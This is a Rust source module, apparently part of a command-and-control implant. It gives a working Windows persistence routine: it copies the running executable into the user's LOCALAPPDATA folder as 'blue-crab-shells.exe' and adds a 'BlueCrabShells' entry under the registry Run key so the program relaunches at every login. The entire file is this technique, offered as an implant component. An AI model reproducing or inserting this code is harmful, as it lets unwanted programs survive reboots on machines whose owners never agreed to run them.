use std::env::{args, var};
use std::path::Path;

// These are necessary for compiling on Linux
#[cfg(windows)]
use std::fs::copy;
#[cfg(windows)]
use winreg::enums::HKEY_CURRENT_USER;
#[cfg(windows)]
use winreg::RegKey;

pub fn handle() -> Result<String, String> {
    #[cfg(windows)]
    match var("LOCALAPPDATA") {
        Ok(v) => {
            let mut persist_path: String = v;
            // Create our persistence path. Note the r" for
            // the raw string. This is for the backslashes
            persist_path.push_str(r"\blue-crab-shells.exe");
            // Get the current exe path
            let exe_path = args().nth(0).unwrap();
            // Move the agent over
            copy(&exe_path, &persist_path).unwrap();
            // Registry stuff!
            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
            let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
            // Createing returns the key and dispotision (New or exists), which we
            // Don't care about for this
            let (key, _) = hkcu.create_subkey(&path).unwrap();
            key.set_value("BlueCrabShells", &persist_path).unwrap();
            Ok("Persistence accomplished".to_string())
        }
        Err(_) => Err("Couldn't get LOCALAPPDATA".to_string()),
    }
}
